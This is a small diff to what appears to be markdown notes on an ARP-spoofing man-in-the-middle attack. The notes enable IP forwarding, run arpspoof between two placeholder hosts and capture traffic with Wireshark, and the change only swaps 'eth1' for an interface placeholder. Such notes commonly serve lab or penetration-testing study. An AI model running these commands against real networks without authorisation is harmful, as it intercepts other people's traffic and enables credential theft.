@@ -8,10 +8,10 @@ echo 1 > /proc/sys/net/ipv4/ip_forward
 cat /proc/sys/net/ipv4/ip_forward
 ```
 ```
-arpspoof -i eth1 -t <ip1> -r <ip2>
+arpspoof -i <interface> -t <ip1> -r <ip2>
 ```
 ```
-sudo wireshark -i eth1 -k
+sudo wireshark -i <interface> -k
 ```
 
 
